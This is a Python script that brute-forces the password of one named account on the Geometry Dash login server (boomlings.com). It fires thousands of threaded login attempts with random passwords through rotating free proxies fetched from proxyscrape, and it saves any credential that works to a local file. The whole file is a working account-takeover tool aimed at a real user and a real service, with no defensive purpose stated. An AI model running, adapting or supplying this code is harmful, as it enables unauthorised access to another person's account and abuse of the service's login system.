from requests import get, post
from threading import Thread
from random import randint, choice
from uuid import uuid4

head = {
    'Accept-Encoding': None,
    'User-Agent': "",
    'Accept': '*/*',
    'Accept-Language': None,
    'Content-Length': '82',
    'Content-Type': 'application/x-www-form-urlencoded'
}
chars_password = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-"
counter = 1
def login(proxy):
    global counter
    try:
        r = "udid=" +str(uuid4())+ "&userName=TrusTa&password=" +"".join(choice(chars_password)for i in range(randint(6, 19)))+ "&secret=Wmfv3899gc9"
        data = post(url="http://www.boomlings.com/database/accounts/loginGJAccount.php", data=r, headers=head, proxies= {"http": proxy}).content.decode()
        if data.startswith("3"):
            with open("password.txt", "a") as f:
                f.write(r)
            print("Success")
            print(r)

        elif data == "-1":
            print(str(counter)+" | failed")
            counter += 1
    except Exception as e:
        pass

while (True):
    proxylist = []
    url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&simplified=true"
    try:  
        r = get(url)
    except:
        continue
    for proxy in r.text.splitlines():
        proxylist.append(proxy)
    for i in range(2500):
        proxy = choice(proxylist)
        t = Thread(target=login, args=(proxy,))
        t.daemon = True
        t.start()